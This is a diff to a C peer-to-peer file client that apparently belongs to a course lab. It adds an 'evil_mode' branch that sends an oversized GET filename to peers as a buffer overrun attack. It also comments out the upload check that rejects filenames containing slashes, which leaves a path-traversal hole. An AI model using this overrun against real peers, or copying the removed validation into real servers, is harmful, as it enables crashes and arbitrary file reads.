@@ -526,15 +526,27 @@ static void task_download(task_t *t, task_t *tracker_task)
 		goto try_again;
 
 	// Connect to the peer and write the GET command
-	message("* Connecting to %s:%d to download '%s'\n",
-		inet_ntoa(t->peer_list->addr), t->peer_list->port,
-		t->filename);
+	message("* Connecting to %s:%d ",//to download '%s'\n",
+		inet_ntoa(t->peer_list->addr), t->peer_list->port);
+//		t->filename);
 	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
 	if (t->peer_fd == -1) {
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	if (evil_mode == 1) {
+		// buffer overrun attack
+		char overrun_attack[FILENAMESIZ * 3];
+		memset(overrun_attack, 98, FILENAMESIZ * 3);
+		overrun_attack[FILENAMESIZ * 3 - 2] = '\0';
+		message("to download '%s'\n", overrun_attack);
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", overrun_attack);
+		task_free(t);
+		return;
+	} else {
+		message("to download '%s'\n", t->filename);
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	}
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -573,6 +585,11 @@ static void task_download(task_t *t, task_t *tracker_task)
 			/* End of file */
 			break;
 
+		// check to limit the download file size
+		// if (t->total_written > FILE_DOWNLOAD_LIMIT) {
+		//task_free(t);
+		//return;
+		//}
 		ret = write_from_taskbuf(t->disk_fd, t);
 		if (ret == TBUF_ERROR) {
 			error("* Disk write error");
@@ -653,7 +670,7 @@ static void task_upload(task_t *t)
 	assert(t->head == 0);
 
 
-	if (strlen(t->filename) > (FILENAMESIZ + strlen("GET OSP2P\n"))) {
+	if (strlen(t->filename) > (FILENAMESIZ + strlen("GET  OSP2P\n"))) {
     perror("request too long\n");
   }
 
@@ -666,9 +683,11 @@ static void task_upload(task_t *t)
   // check that file is in our current directory
   // im not actually sure if this is correct or enough
   // to determine correct directory
+  /*
   if (strstr(t->filename, "/") != NULL) {
     perror("invalid filename");
   }
+*/
 
 
 	t->disk_fd = open(t->filename, O_RDONLY);
